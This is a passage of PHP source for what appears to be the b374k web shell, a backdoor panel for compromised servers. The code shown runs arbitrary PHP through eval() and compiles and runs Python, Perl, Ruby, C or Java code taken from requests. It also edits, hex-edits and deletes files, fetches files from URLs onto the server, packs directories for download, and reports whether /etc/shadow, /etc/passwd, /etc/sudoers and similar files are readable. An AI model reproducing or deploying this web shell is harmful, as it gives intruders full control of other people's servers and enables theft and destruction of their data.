	$s_java = ($s_java=="1")?true:false;

	// check tar
	if(isset($_COOKIE['s_tar'])){$s_tar = $_COOKIE['s_tar'];}
	else{
		$s_tar = check_access("tar");
		setcookie("s_tar", $s_tar ,time() + $s_login_time);
	}
	$s_tar = ($s_tar=="1")?true:false;

	// sorttable.js
	if(isset($_REQUEST['sorttable'])){
		$data = gzinflate(base64_decode($sortable_js));
		header("Content-type: text/javascript");
		header("Cache-control: public");
		echo $data;
		exit;
	}
	if(!empty($_REQUEST['dltype']) && !empty($_REQUEST['dlpath'])){
		$dltype = ss($_REQUEST['dltype']);
		$dlpath = ss($_REQUEST['dlpath']);

		$dlname = basename($dlpath);
		if($dlpath==".") $dlname=basename($cwd);
		elseif($dlpath==".."){
			chdir("..");
			$dlname=basename(getcwd());
			chdir($cwd);
		}
		$tmpdir = get_writabledir();
		$dlarchive = $tmpdir.$dlname;
		$dlthis = "";
		if($dltype=="ziparchive"){
			$dlarchive .= ".zip";
			if(zip($dlpath,$dlarchive)){
				$dlthis = $dlarchive;
			}
		}
		elseif($dltype=="tar"){
			$dlarchive .= ".tar";
			$dlarchive = str_replace('\\', '/', $dlarchive);
			exe("tar cf ".$dlarchive." ".$dlpath);
			$dlthis = $dlarchive;
		}
		elseif($dltype=="targz"){
			$dlarchive .= ".tar.gz";
			$dlarchive = str_replace('\\', '/', $dlarchive);
			exe("tar czf ".$dlarchive." ".$dlpath);
			$dlthis = $dlarchive;
		}
		elseif($dltype=="raw"){
			if(is_file($dlpath)) $dlthis = $dlpath;
		}

		if(is_file($dlthis)){
			header("Content-Type: application/octet-stream");
			header('Content-Transfer-Encoding: binary');
			header("Content-length: ".@filesize($dlthis));
			header("Content-disposition: attachment; filename=\"".basename($dlthis)."\";");
			$file = @fopen($dlthis,"rb");
			while(!feof($file)){
				print(@fread($file, 1024*8));
				ob_flush();
				flush();
			}
			fclose($file);

			if($dltype!="raw"){
				rename($dlthis,$dlthis."del");
				unlink($dlthis."del");
			}
			exit;
		}
	}
	// view image specified by ?img=<file>
	if(isset($_REQUEST['img'])){
		ob_clean();
		$d = ss($_REQUEST['d']);
		$f = ss($_REQUEST['img']);
		$inf = @getimagesize($d.$f);
		$ext = explode($f,".");
		$ext = $ext[count($ext)-1];
	 	header("Content-type: ".$inf["mime"]);
	 	header("Cache-control: public");
		header("Expires: ".@date("r",@mktime(0,0,0,1,1,2030)));
		header("Cache-control: max-age=".(60*60*24*7));#
	 	readfile($d.$f);
	 	exit;
	}
	
	// rename file or folder
	if(isset($_REQUEST['rename']) && isset($_REQUEST['oldname']) && isset($_REQUEST['newname'])){
		$old = ss($_REQUEST['oldname']);
		$new = ss($_REQUEST['newname']);

		$renmsg = "";
		if(is_dir($old)) $renmsg = (@rename($cwd.$old,$cwd.$new)) ? "Directory ".$old." renamed to ".$new : "Unable to rename directory ".$old." to ".$new;
		elseif(is_file($old)) $renmsg = (@rename($cwd.$old,$cwd.$new)) ? "File ".$old." renamed to ".$new : "Unable to rename file ".$old." to ".$new;
		else $renmsg = "Cannot find the path specified ".$old;

		$s_result .= "<p class='notif'>".$renmsg."</p>";
		$fnew = $cwd.$new;
	}
	
	// confirm delete
	if(!empty($_REQUEST['del'])){
		$del = trim($_REQUEST['del']);
		$s_result .= "<p class='notif'>Delete ".basename($del)." ? <a href='".$s_self."delete=".$del."'>Yes</a> | <a href='".$s_self."'>No</a></p>";
	}// delete file
	elseif(!empty($_REQUEST['delete'])){
		$f = ss($_REQUEST['delete']);
		$delmsg = "";
		if(is_file($f)){
			$delmsg = (unlink($f)) ? "File removed : ".$f : "Unable to remove file ".$f;
		}
		elseif(is_dir($f)){
			rmdirs($f);
			$delmsg = (is_dir($f)) ? "Unable to remove directory ".$f : "Directory removed : ".$f;
		}
		else $delmsg = "Cannot find the path specified ".$f;
		$s_result .= "<p class='notif'>".$delmsg."</p>";
	} // create dir
	elseif(!empty($_REQUEST['mkdir'])){
		$f = ss($cwd.ss($_REQUEST['mkdir']));
		$dirmsg = "";
		if(!is_dir($f)){
			mkdir($f);
			if(is_dir($f)) $dirmsg = "Directory created ".$f;
			else $dirmsg = "Unable to create directory ".$f;
		}
		else $dirmsg = "Directory already exists ".$f;
		$s_result .= "<p class='notif'>".$dirmsg."</p>";
	}

	// php eval() function
	if(isset($_REQUEST['eval'])){
		$code = "";
		$res = "";
		$gccoption = "";
		$lang = "php";

		if(isset($_REQUEST['evalcode'])){
			$code = ssc($_REQUEST['evalcode']);
			$gccoption = (isset($_REQUEST['gccoption']))? " ".ssc($_REQUEST['gccoption']):"";
			$tmpdir = get_writabledir();

			if(isset($_REQUEST['lang'])){$lang = $_REQUEST['lang'];}

			if(strtolower($lang)=='php'){
				ob_start();
				eval($code);
				$res = ob_get_contents();
				ob_end_clean();
			}
			elseif(strtolower($lang)=='python'||strtolower($lang)=='perl'||strtolower($lang)=='ruby'){
				$rand = md5(time().rand(0,100));
				$script = $tmpdir.$rand;
				file_put_contents($script, $code);
				if(is_file($script)){
					$res = exe($lang." ".$script.$gccoption);
					unlink($script);
				}
			}
			elseif(strtolower($lang)=='gcc'){
				$script = md5(time().rand(0,100));
				chdir($tmpdir);
				file_put_contents($script.".c", $code);
				if(is_file($script.".c")){
					$scriptout = $s_win ? $script.".exe" : $script;
					$res = exe("gcc ".$script.".c -o ".$scriptout.$gccoption);
					if(is_file($scriptout)){
						$res = $s_win ? exe($scriptout) : exe("chmod +x ".$scriptout." ; ./".$scriptout);
						rename($scriptout, $scriptout."del");
						unlink($scriptout."del");
					}
					unlink($script.".c");
				}
				chdir($cwd);
			}
			elseif(strtolower($lang)=='java'){
				if(preg_match("/class\ ([^{]+){/i",$code, $r)){
					$classname = trim($r[1]);
					$script = $classname;
				}
				else{
					$rand = "b374k_".substr(md5(time().rand(0,100)),0,8);
					$script = $rand;
					$code = "class ".$rand." { ".$code . " } ";
				}
				chdir($tmpdir);
				file_put_contents($script.".java", $code);
				if(is_file($script.".java")){
					$res = exe("javac ".$script.".java");
					if(is_file($script.".class")){
						$res .= exe("java ".$script.$gccoption);
						unlink($script.".class");
					}
					unlink($script.".java");
				}
				chdir($pwd);
			}
		}

		$lang_available = "<option value='php'>php</option>";
		$selected = "";
		if($s_python){
			$checked = ($lang == "python") ? "selected" : "";
			$lang_available .= "<option value='python' ".$checked.">python</option>";
		}
		if($s_perl){
			$checked = ($lang == "perl") ? "selected" : "";
			$lang_available .= "<option value='perl' ".$checked.">perl</option>";
		}
		if($s_ruby){
			$checked = ($lang == "ruby") ? "selected" : "";
			$lang_available .= "<option value='ruby' ".$checked.">ruby</option>";
		}
		if($s_gcc){
			$checked = ($lang == "gcc") ? "selected" : "";
			$lang_available .= "<option value='gcc' ".$checked.">c</option>";
		}
		if($s_java){
			$checked = ($lang == "java") ? "selected" : "";
			$lang_available .= "<option value='java' ".$checked.">java</option>";
		}
		$gccoptionclass = ($lang=="php")? "sembunyi":"";
		$e_result = (!empty($res)) ? "<pre id='evalres' style='border-top:1px solid #393939;margin:4px 0 0 0;padding:6px 0;' >".hss($res)."</pre>":"";
		$s_result .= "<form action='".$s_self."' method='post'>
					<textarea id='evalcode' name='evalcode' style='height:150px;' class='txtarea'>".hss($code)."</textarea>
					<table><tr><td style='padding:0;'><p><input type='submit' name='evalcodesubmit' class='inputzbut' value='Go !' style='width:120px;height:30px;' /></p>
					</td><td><select name='lang' onchange='evalselect(this);' class='inputzbut' style='width:120px;height:30px;padding:4px;'>
					".$lang_available."
					</select>
					</td>
					<td><div id='additionaloption' class='".$gccoptionclass."'>Additional option<input class='inputz' style='width:400px;' type='text' name='gccoption' value='".hss($gccoption)."' title='If you want to give additional option to interpreter or compiler, give it here' id='gccoption' /></div></td>
					</tr>
					</table>
					".$e_result."
					<input type='hidden' name='eval' value='' />
					</form>
					";
	}
	// find
	elseif(isset($_REQUEST['find'])){
		$p = cp($_REQUEST['find']);

		$type = isset($_REQUEST['type']) ? $_REQUEST['type'] : "sfile";
		$sfname = (!empty($_REQUEST['sfname']))?ssc($_REQUEST['sfname']):'';
		$sdname = (!empty($_REQUEST['sdname']))?ssc($_REQUEST['sdname']):'';
		$sfcontain = (!empty($_REQUEST['sfcontain']))?ssc($_REQUEST['sfcontain']):'';

		$sfnameregexchecked=$sfnameicasechecked=$sdnameregexchecked=$sdnameicasechecked=$sfcontainregexchecked=$sfcontainicasechecked=$swritablechecked=$sreadablechecked=$sexecutablechecked="";
		$sfnameregex=$sfnameicase=$sdnameregex=$sdnameicase=$sfcontainregex=$sfcontainicase=$swritable=$sreadable=$sexecutable=false;

		if(isset($_REQUEST['sfnameregex'])){$sfnameregex=true;$sfnameregexchecked="checked";}
		if(isset($_REQUEST['sfnameicase'])){$sfnameicase=true;$sfnameicasechecked="checked";}
		if(isset($_REQUEST['sdnameregex'])){$sdnameregex=true;$sdnameregexchecked="checked";}
		if(isset($_REQUEST['sdnameicase'])){$sdnameicase=true;$sdnameicasechecked="checked";}
		if(isset($_REQUEST['sfcontainregex'])){$sfcontainregex=true;$sfcontainregexchecked="checked";}
		if(isset($_REQUEST['sfcontainicase'])){$sfcontainicase=true;$sfcontainicasechecked="checked";}
		if(isset($_REQUEST['swritable'])){$swritable=true;$swritablechecked="checked";}
		if(isset($_REQUEST['sreadable'])){$sreadable=true;$sreadablechecked="checked";}
		if(isset($_REQUEST['sexecutable'])){$sexecutable=true;$sexecutablechecked="checked";}

		$sexecb = (function_exists("is_executable")) ? "<input type='checkbox' name='sexecutable' value='sexecutable' id='se' ".$sexecutablechecked." /><label for='se'>Executable</span>":"";

		$candidate = array();
		if(isset($_REQUEST['sgo'])){
			$af = "";

			$candidate = getallfiles($p);
			if($type=='sfile') $candidate = array_filter($candidate, "is_file");
			elseif($type=='sdir') $candidate = array_filter($candidate, "is_dir");

			foreach($candidate as $a){
				if($type=='sdir'){
					if(!empty($sdname)){
						if($sdnameregex){
							if($sdnameicase){if(!preg_match("/".$sdname."/i", basename($a))) $candidate = array_diff($candidate,array($a));}
							else{if(!preg_match("/".$sdname."/", basename($a))) $candidate = array_diff($candidate,array($a));}
						}
						else{
							if($sdnameicase){if(strpos(strtolower(basename($a)),strtolower($sdname))===false) $candidate = array_diff($candidate,array($a));}
							else{if(strpos(basename($a),$sdname)===false) $candidate = array_diff($candidate,array($a));}
						}
					}
				}
				elseif($type=='sfile'){
					if(!empty($sfname)){
						if($sfnameregex){
							if($sfnameicase){if(!preg_match("/".$sfname."/i", basename($a))) $candidate = array_diff($candidate,array($a));}
							else{if(!preg_match("/".$sfname."/", basename($a))) $candidate = array_diff($candidate,array($a));}
						}
						else{
							if($sfnameicase){if(strpos(strtolower(basename($a)),strtolower($sfname))===false) $candidate = array_diff($candidate,array($a));}
							else{if(strpos(basename($a),$sfname)===false) $candidate = array_diff($candidate,array($a));}
						}
					}
					if(!empty($sfcontain)){
						$sffcontent = @file_get_contents($a);
						if($sfcontainregex){
							if($sfcontainicase){if(!preg_match("/".$sfcontain."/i", $sffcontent)) $candidate = array_diff($candidate,array($a));}
							else{if(!preg_match("/".$sfcontain."/",  $sffcontent)) $candidate = array_diff($candidate,array($a));}
						}
						else{
							if($sfcontainicase){if(strpos(strtolower($sffcontent),strtolower($sfcontain))===false) $candidate = array_diff($candidate,array($a));}
							else{if(strpos($sffcontent,$sfcontain)===false) $candidate = array_diff($candidate,array($a));}
						}
					}
				}
			}
		}

		$f_result = "";$link="";
		foreach($candidate as $c){
			$c=trim($c);
			if($swritable && !is_writable($c)) continue;
			if($sreadable && !is_readable($c)) continue;
			if($sexecutable && !is_executable($c)) continue;
			if($type=="sfile") $link = $s_self."cd=".cp(dirname($c))."&view=".basename($c);
			elseif($type=="sdir") $link = $s_self."cd=".cp($c);
			$f_result .= "<p class='notif' onmouseup=\"return go('".addslashes($link)."',event);\"><a href='".$link."' target='_blank'>".$c."</a></p>";
		}

		$tsdir = ($type=="sdir")? "selected":"";
		$tsfile = ($type=="sfile")? "selected":"";

		if(!is_dir($p)) $s_result .= "<p class='notif'>Cannot find the path specified ".$p."</p>";
		$s_result .= "<form action='".$s_self."' method='post'>
		<div class='mybox'><h2>Find</h2>
		<table class='myboxtbl'>
		<tr><td style='width:140px;'>Search in</td>
		<td colspan='2'><input style='width:100%;' value='".hss($p)."' class='inputz' type='text' name='find' /></td></tr>
		<tr onclick=\"findtype('sdir');\">
			<td>Dirname contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sdname' value='".hss($sdname)."' /></td>
			<td>
				<input type='checkbox' name='sdnameregex' id='sdn' ".$sdnameregexchecked." /><label for='sdn'>Regex (pcre)</label>
				<input type='checkbox' name='sdnameicase' id='sdi' ".$sdnameicasechecked." /><label for='sdi'>Case Insensitive</label>
			</td>
		</tr>
		<tr onclick='findtype('sfile');'>
			<td>Filename contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfname' value='".hss($sfname)."' /></td>
			<td>
				<input type='checkbox' name='sfnameregex'  id='sfn' ".$sfnameregexchecked." /><label for='sfn'>Regex (pcre)</label>
				<input type='checkbox' name='sfnameicase'  id='sfi' ".$sfnameicasechecked." /><label for='sfi'>Case Insensitive</label>
			</td>
		</tr>
		<tr onclick=\"findtype('sfile');\">
			<td>File contains</td>
			<td style='width:400px;'><input class='inputz' style='width:100%;' type='text' name='sfcontain' value='".hss($sfcontain)."' /></td>
			<td>
				<input type='checkbox' name='sfcontainregex' id='sff' ".$sfcontainregexchecked." /><label for='sff'>Regex (pcre)</label>
				<input type='checkbox' name='sfcontainicase' id='sffi' ".$sfcontainicasechecked." /><label for='sffi'>Case Insensitive</label>
			</td>
		</tr>
		<tr>
			<td>Permissions</td>
			<td colspan='2'>
				<input type='checkbox' name='swritable' id='sw' ".$swritablechecked." /><label for='sw'>Writable</label>
				<input type='checkbox' name='sreadable' id='sr' ".$sreadablechecked." /><label for='sr'>Readable</label>
				".$sexecb."
			</td>
		</tr>
		<tr><td colspan='3'>
		<input type='submit' name='sgo' class='inputzbut' value='Search !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
		<select name='type' id='type' class='inputzbut' style='width:120px;height:30px;margin:10px 2px 0 2px;'>
			<option value='sfile' ".$tsfile.">Search file</option>
			<option value='sdir' ".$tsdir.">Search dir</option>
		</select>
		</td></tr>
		</table>
		</div>
		</form>
		<div>
		".$f_result."
		</div>
		";
	}
	// upload !
	elseif(isset($_REQUEST['upload'])){
		$s_result = " ";
		$msg = "";
		if(isset($_REQUEST['uploadhd'])){
			$fn = $_FILES['filepath']['name'];
			if(is_uploaded_file($_FILES['filepath']['tmp_name'])){
				$p = cp(ss($_REQUEST['savefolder']));
				if(!is_dir($p)) $p = cp(dirname($p));
				if(isset($_REQUEST['savefilename']) && (trim($_REQUEST['savefilename'])!="")) $fn = ss($_REQUEST['savefilename']);
				$tm = $_FILES['filepath']['tmp_name'];
				$pi = cp($p).$fn;
				$st = @move_uploaded_file($tm,$pi);
				if($st)	$msg = "<p class='notif'>File uploaded to <a href='".$s_self."view=".basename($pi)."'>".$pi."</a></p>";
				else $msg = "<p class='notif'>Failed to upload ".$fn."</p>";
			}
			else $msg = "<p class='notif'>Failed to upload ".$fn."</p>";
		}
		elseif(isset($_REQUEST['uploadurl'])){
			// function dlfile($url,$fpath){
			$p = cp(ss($_REQUEST['savefolderurl']));
			if(!is_dir($p)) $p = cp(dirname($p));
			$fu = ss($_REQUEST['fileurl']);
			$fn = basename($fu);
			if(isset($_REQUEST['savefilenameurl']) && (trim($_REQUEST['savefilenameurl'])!="")) $fn = ss($_REQUEST['savefilenameurl']);
			$fp = cp($p).$fn;
			$st = dlfile($fu,$fp);
			if($st) $msg = "<p class='notif'>File uploaded to <a href='".$s_self."view=".basename($fp)."'>".$fp."</a></p>";
			else $msg = "<p class='notif'>Failed to upload ".$fn."</p>";
		}
		else{
			if(!is_writable($cwd)) $msg = "<p class='notif'>Directory ".$cwd." is not writable, please change to a writable one</p>";
		}

		if(!empty($msg)) $s_result .= $msg;
		$s_result .= "
			<form action='".$s_self."upload' method='post' enctype='multipart/form-data'>
			<div class='mybox'><h2>Upload from computer</h2>
			<table class='myboxtbl'>
			<tr><td style='width:140px;'>File</td><td><input type='file' name='filepath' class='inputzbut' style='width:400px;margin:0;' />
			</td></tr>
			<tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolder' value='".$cwd."' /></td></tr>
			<tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilename' value='' /></td></tr>
			<tr><td>&nbsp;</td><td>
			<input type='submit' name='uploadhd' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			</td></tr>
			</table>
			</div>
			</form>
			<form action='".$s_self."upload' method='post'>
			<div class='mybox'><h2>Upload from internet</h2>
			<table class='myboxtbl'>
			<tr><td style='width:150px;'>File URL</td><td><input style='width:100%;' class='inputz' type='text' name='fileurl' value='' />
			</td></tr>
			<tr><td>Save to</td><td><input style='width:100%;' class='inputz' type='text' name='savefolderurl' value='".$cwd."' /></td></tr>
			<tr><td>Filename (optional)</td><td><input style='width:100%;' class='inputz' type='text' name='savefilenameurl' value='' /></td></tr>
			<tr><td>&nbsp;</td><td>
			<input type='submit' name='uploadurl' class='inputzbut' value='Upload !' style='width:120px;height:30px;margin:10px 2px 0 2px;' />
			</td></tr>
			</table>
			</div>
			</form>
			";
	} // view file
	elseif(isset($_REQUEST['view'])){
		$f = ss($_REQUEST['view']);
		if(isset($fnew) && (trim($fnew)!="")) $f = $fnew;
		$owner = "";
		if(is_file($f)){
			if(!$s_win && $s_posix){
				$name = posix_getpwuid(fileowner($f));
				$group = posix_getgrgid(filegroup($f));
				$owner = "<tr><td>Owner</td><td>".$name['name']."<span class='gaya'> : </span>".$group['name']."</td></tr>";
			}
			$filn = basename($f);
			$dlfile = get_archiver_available();
			$dlfile = str_replace("__dlpath__",$filn,$dlfile);
			$dlfile = str_replace("__dlcwd__",$cwd,$dlfile);
			$s_result .= "<table class='viewfile' style='width:100%;'>
			<tr><td style='width:140px;'>Filename</td><td><span id='".cs($filn)."_link'>".$filn."</span>
			<div id='".cs($filn)."_form' class='sembunyi'>
			<form action='".$s_self."view=".basename($f)."' method='post'>
				<input type='hidden' name='oldname' value='".$filn."' style='margin:0;padding:0;' />
				<input class='inputz' style='width:200px;' type='text' name='newname' value='".$filn."' />
				<input class='inputzbut' type='submit' name='rename' value='rename' />
			</form>
			<input class='inputzbut' type='button' value='x' onclick=\"tukar('".cs($filn)."_form','".cs($filn)."_link');\" />
			</div>
			</td></tr>
			<tr><td>Size</td><td>".gs($f)." (".@filesize($f).")</td></tr>
			<tr><td>Permission</td><td>".gp($f)."</td></tr>
			".$owner."
			<tr><td>Create time</td><td>".@date("d-M-Y H:i",filectime($f))."</td></tr>
			<tr><td>Last modified</td><td>".@date("d-M-Y H:i",filemtime($f))."</td></tr>
			<tr><td>Last accessed</td><td>".@date("d-M-Y H:i",fileatime($f))."</td></tr>
			<tr><td>Actions</td><td>
			<a href='".$s_self."edit=".realpath($f)."' title='edit'>edit</a> |
			<a href='".$s_self."hexedit=".realpath($f)."' title='edit as hex'>hex</a> |
			<a href=\"javascript:tukar('".cs($filn)."_link','".cs($filn)."_form');\" title='rename'>ren</a> |
			<a href='".$s_self."del=".$filn."' title='delete'>del</a> ".$dlfile."
			</td></tr>
			<tr><td>View</td><td>
			<a href='".$s_self."view=".$filn."&type=text'>text</a> |
			<a href='".$s_self."view=".$filn."&type=code'>code</a> |
			<a href='".$s_self."view=".$filn."&type=image'>image</a></td></tr>
			</table>
			";

			$t = "";
			$iinfo = @getimagesize($f);
			if(substr($filn,-3,3) == "php") $t = "code";
			if(is_array($iinfo)) $t = 'image';

			if(isset($_REQUEST['type'])) $t = ss($_REQUEST['type']);

			if($t=="image"){
				$width = (int) $iinfo[0];
				$height = (int) $iinfo[1];
				$imginfo = "Image type = ( ".$iinfo['mime']." )<br />
					Image Size = <span class='gaul'>( </span>".$width." x ".$height."<span class='gaul'> )</span><br />";
				if($width > 800){
					$width = 800;
					$imglink = "<p><a href='".$s_self."img=".$filn."' target='_blank'>
					<span class='gaul'>[ </span>view full size<span class='gaul'> ]</span></a></p>";
				}
				else $imglink = "";

				$s_result .= "<div class='viewfilecontent' style='text-align:center;'>".$imglink."
					<img width='".$width."' src='".$s_self."img=".$filn."' alt='".$filn."' style='margin:8px auto;padding:0;border:0;' /></div>";

			}
			elseif($t=="code"){
				$s_result .= "<div class=\"viewfilecontent\">";
				$file = wordwrap(@file_get_contents($f),160,"\n",true);
				$buff = highlight_string($file,true);
				$old = array("0000BB","000000","FF8000","DD0000", "007700");
				$new = array("4C83AF","888888", "87DF45", "EEEEEE" , "FF8000");
				$buff = str_replace($old,$new, $buff);
				$s_result .= $buff;
				$s_result .=  "</div>";
			}
			else {
				$s_result .= "<pre style='padding: 3px 8px 0 8px;' class='viewfilecontent'>";
				$s_result .=  str_replace("<","&lt;",str_replace(">","&gt;",(wordwrap(@file_get_contents($f),160,"\n",true))));
				$s_result .=   "</pre>";
			}
		}
		elseif(is_dir($f)){
			chdir($f);
			$cwd = cp(getcwd());
			$s_result .= showdir($cwd);
		}
		else $s_result .= "<p class='notif'>Cannot find the path specified ".$f."</p>";

	} // edit file
	elseif(isset($_REQUEST['edit'])){
		$f = ss($_REQUEST['edit']);
		$fc = "";
		$fcs = "";

		if(isset($_REQUEST['new'])){
			$num = 1;
			if(is_file($f)){
				$pos = strrpos($f,"_");
				if($pos!==false) $num = (int) substr($f,$pos+1);
				while(is_file(substr($f,0,$pos)."_".$num)){
					$num++;
				}
				$f = substr($f,0,$pos)."_".$num;
			}
		}
		else if(is_file($f)) $fc = @file_get_contents($f);
		

		if(isset($_REQUEST['fc'])){
			$fc = ssc($_REQUEST['fc']);
			if($filez = fopen($f,"w")){
				$time = @date("d-M-Y H:i",time());
				if(fwrite($filez,$fc)!==false) $fcs = "File saved @ ".$time;
				else $fcs = "Failed to save";
				fclose($filez);
			}
			else $fcs = "Permission denied";
		}
		else if(is_file($f) && !is_writable($f)) $fcs = "This file is not writable";

		if(!empty($fcs)) $s_result .= "<p class='notif'>".$fcs."</p>";
		$s_result .= "<form action='".$s_self."' method='post'>
				<textarea id='fc' name='fc' class='txtarea'>".hss($fc)."</textarea>
				<p style='text-align:center;'><input type='text' class='inputz' style='width:99%;' name='edit' value='".$f."' /></p>
				<p><input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' /></p>
				</form>";

	}// hex edit file
	elseif(isset($_REQUEST['hexedit'])){
		$f = ss($_REQUEST['hexedit']);
		$fc = "";
		$fcs = "";
		$lnum = 0;
		$hexes = "";

		if(!empty($_REQUEST['hexes']) || !empty($_REQUEST['hexestxtarea'])){
			if(!empty($_REQUEST['hexes'])){
				foreach($_REQUEST['hexes'] as $hex)	$hexes .= str_replace(" ","", $hex);
			}
			elseif(!empty($_REQUEST['hexestxtarea'])){
				$hexes = trim($_REQUEST['hexestxtarea']);
			}
			if($filez = fopen($f,"w")){
					$bins = pack("H*" , $hexes);
					$time = @date("d-M-Y H:i",time());
					if(fwrite($filez,$bins)!==false) $fcs = "File saved @ ".$time;
					else $fcs = "Failed to save";
					fclose($filez);
				}
			else $fcs = "Permission denied";
		}
		else if(is_file($f) && !is_writable($f)) $fcs = "This file is not writable";

		if(!empty($fcs)) $s_result .= "<p class='notif'>".$fcs."</p>";
		$s_result .= "<form action='".$s_self."' method='post'>
					<p style='padding:0;text-align:center;'><input type='text' class='inputz' style='width:99%;' name='hexedit' value='".$f."' /></p>
					<p style='padding:0 0 14px 0;border-bottom:1px solid #393939;'><input type='submit' name='fcsubmit' class='inputzbut' value='Save !' style='width:120px;height:30px;' onclick=\"return submithex();\" /></p>
					<table class='explore'>
					";
		if(is_file($f)){
			$fp = fopen($f,"r");
			if($fp) {
				$ldump = "";
				$counter = 0;
				$icounter = 0;
				while(!feof($fp)){
					$line = fread($fp, 32);
					$linedump = preg_replace('/[^\x21-\x7E]/','.', $line);
					$linehex = strtoupper(bin2hex($line));
					$linex = str_split($linehex,2);
					$linehex = implode(" ", $linex);
					$addr = sprintf("%08xh",$icounter);

					$s_result .= "<tr><td style='text-align:center;width:60px;'>".$addr."</td><td style='text-align:left;width:580px;'>
					<input onclick=\"hexupdate('".$counter."',event);\" onkeydown=\"return hexfix('".$counter."',event);\" onkeyup=\"hexupdate('".$counter."',event);\" type='text' class='inputz' id='hex_".$counter."' name='hexes[]' value='".$linehex."' style='width:570px;' maxlength='".strlen($linehex)."' /></td>
					<td style='text-align:left;letter-spacing:2px;' name='hexdump' id='dump_".$counter."'>".hss($linedump)."</td></tr>";
					$counter++;
					$icounter+=32;
				}
				$s_result .= "<input type='hidden' id='counter' value='".$counter."' />";
				$s_result .= "<textarea name='hexestxtarea' id='hexestxtarea' class='sembunyi'></textarea>";
				fclose($fp);
			}
		}
		$s_result .= "</table></form>";

	}// show server information
	elseif(isset($_REQUEST['info'])){
		$s_result = "";
		// server misc info
		$s_result .= "<p class='notif' onclick=\"toggle('info_server')\">Server Info</p>";
		$s_result .= "<div class='info' id='info_server'><table>";

		if($s_win){
			foreach (range("A","Z") as $letter){
				if((is_dir($letter.":\\") && is_readable($letter.":\\"))){
					$drive = $letter.":";
					$s_result .= "<tr><td>drive ".$drive."</td><td>".ts(disk_free_space($drive))." free of ".ts(disk_total_space($drive))."</td></tr>";
				}
			}
		}
		else $s_result .= "<tr><td>root partition</td><td>".ts(disk_free_space("/"))." free of ".ts(disk_total_space("/"))."</td></tr>";

		$s_result .= "<tr><td>php</td><td>".phpversion()."</td></tr>";
		if($s_python) $s_result .= "<tr><td>python</td><td>".exe("python -V")."</td></tr>";
		if($s_perl)	$s_result .= "<tr><td>perl</td><td>".exe("perl -e \"print \$]\"")."</td></tr>";
		if($s_ruby)	$s_result .= "<tr><td>ruby</td><td>".exe("ruby -v")."</td></tr>";
		if($s_gcc){
			$gcc_version = exe("gcc --version");
			$gcc_ver = explode("\n",$gcc_version);
			if(count($gcc_ver)>0) $gcc_ver = $gcc_ver[0];
			$s_result .= "<tr><td>gcc</td><td>".$gcc_ver."</td></tr>";
		}
		if($s_java) $s_result .= "<tr><td>java</td><td>".str_replace("\n", ", ", exe("java -version"))."</td></tr>";

		$interesting = array(
		"/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases", "/etc/resolv.conf", "/etc/sysctl.conf",
		"/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
		"/etc/ssh/sshd_config", 
		"/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf"," /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
		"/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
		"/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules");
		foreach($interesting as $f){
			if(is_file($f) && is_readable($f))
				$s_result .= "<tr><td>".$f."</td><td><a href='".$s_self."view=".$f."'>".$f." is readable</a></td></tr>";
		}
		

		$s_result .= "</table></div>";

		if(!$s_win){
			// cpu info
			if($i_buff=trim(@file_get_contents("/proc/cpuinfo"))){
				$s_result .= "<p class='notif' onclick=\"toggle('info_cpu')\">CPU Info</p>";
				$s_result .= "<div class='info' id='info_cpu'>";
				$i_buffs = explode("\n\n", $i_buff);
				foreach($i_buffs as $i_buffss){
					$i_buffss = trim($i_buffss);
					if($i_buffss!=""){
						$i_buffsss = explode("\n",$i_buffss);
						$s_result .= "<table>";
						foreach($i_buffsss as $i){
							$i = trim($i);
							if($i!=""){
								$ii = explode(":",$i);
								if(count($ii)==2) $s_result .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
							}
						}
						$s_result .= "</table>";
					}
				}
				$s_result .= "</div>";
			}
			// mem info
			if($i_buff=trim(@file_get_contents("/proc/meminfo"))){
				$s_result .= "<p class='notif' onclick=\"toggle('info_mem')\">Memory Info</p>";
				$i_buffs = explode("\n",$i_buff);
				$s_result .= "<div class='info' id='info_mem'><table>";
				foreach($i_buffs as $i){
					$i = trim($i);
					if($i!=""){
						$ii = explode(":",$i);
						if(count($ii)==2) $s_result .= "<tr><td>".$ii[0]."</td><td>".$ii[1]."</td></tr>";
					}
					else $s_result .= "</table><table>";
				}
				$s_result .= "</table></div>";
			}
			// partition
			if($i_buff=trim(@file_get_contents("/proc/partitions"))){
				$i_buff = preg_replace("/\ +/"," ",$i_buff);
				$s_result .= "<p class='notif' onclick=\"toggle('info_part')\">Partitions Info</p>";
				$s_result .= "<div class='info' id='info_part'>";
				$i_buffs = explode("\n\n", $i_buff);
				$s_result .= "<table><tr>";
				$i_head = explode(" ",$i_buffs[0]);
				foreach($i_head as $h) $s_result .= "<th>".$h."</th>";
				$s_result .= "</tr>";
				$i_buffss = explode("\n", $i_buffs[1]);
				foreach($i_buffss as $i_b){
					$i_row = explode(" ",trim($i_b));
					$s_result .= "<tr>";
					foreach($i_row as $r) $s_result .= "<td style='text-align:center;'>".$r."</td>";
					$s_result .= "</tr>";
				}
				$s_result .= "</table>";
				$s_result .= "</div>";
			}
		}
		$phpinfo = array(
			"PHP General" => INFO_GENERAL,
			"PHP Configuration" => INFO_CONFIGURATION,
			"PHP Modules" => INFO_MODULES,
			"PHP Environment" => INFO_ENVIRONMENT,
